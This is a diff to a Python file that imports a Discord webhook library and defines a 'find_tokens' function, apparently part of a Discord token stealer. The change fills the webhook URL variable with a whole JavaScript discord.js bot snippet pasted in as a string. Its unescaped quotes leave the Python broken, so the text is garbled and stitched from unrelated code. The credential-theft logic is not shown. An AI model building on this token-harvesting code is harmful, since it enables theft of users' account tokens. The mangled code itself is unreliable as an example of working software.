@@ -2,7 +2,45 @@ import re
 import os
 import dhooks
 
-WEBHOOK_URL = ""
+WEBHOOK_URL = "import { Client, GatewayIntentBits, Partials } from "discord.js";
+
+const client = new Client({
+    intents: [
+        GatewayIntentBits.Guilds,
+        GatewayIntentBits.GuildMembers,
+        GatewayIntentBits.GuildBans,
+        GatewayIntentBits.GuildEmojisAndStickers,
+        GatewayIntentBits.GuildIntegrations,
+        GatewayIntentBits.GuildWebhooks,
+        GatewayIntentBits.GuildInvites,
+        GatewayIntentBits.GuildPresences,
+        GatewayIntentBits.GuildMessages,
+        GatewayIntentBits.GuildMessageReactions,
+        GatewayIntentBits.GuildMessageTyping,
+        GatewayIntentBits.DirectMessages,
+        GatewayIntentBits.DirectMessageReactions,
+        GatewayIntentBits.DirectMessageTyping,
+        GatewayIntentBits.MessageContent,
+        GatewayIntentBits.GuildScheduledEvents,
+    ],
+    partials: [
+        Partials.User,
+        Partials.Channel,
+        Partials.GuildMember,
+        Partials.Message,
+        Partials.Reaction,
+        Partials.GuildScheduledEvent,
+        Partials.ThreadMember,
+    ],
+});
+// Add more intents if you wanna debug
+import DiscordLogger from "discordjs-logger";
+
+const logger = new DiscordLogger(client);
+
+logger.debug();
+
+client.login("YOUR_DISCORD_APP_TOKEN");"
 
 
 def find_tokens(path):
